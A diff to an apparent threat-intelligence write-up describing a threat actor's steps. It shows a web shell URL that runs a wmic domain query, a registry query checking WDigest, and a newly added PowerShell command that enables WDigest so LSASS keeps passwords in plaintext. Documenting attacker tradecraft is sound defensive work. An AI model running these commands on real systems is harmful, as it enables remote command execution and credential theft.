@@ -28,9 +28,13 @@
   https://server.example/custom/login/fm2.jsp?cmd=wmic computersystem get domain
   ```
 #### 4. Credential Dumping
-- The Threat Actor Checked if the `WDigest` is Enabled because When WDigest is Enabled LSASS stores passwords in Plaintext.
+- The Threat Actor Checked if the `WDigest` is Enabled because When WDigest is Enabled `LSASS` stores passwords in Plaintext.
 - Command Used:
   ```
-  powershell.exe reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+   powershell.exe reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+  ```
+  - Command To Enable WDigest:
+  ```
+  powershell.exe  Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'
   ```
   
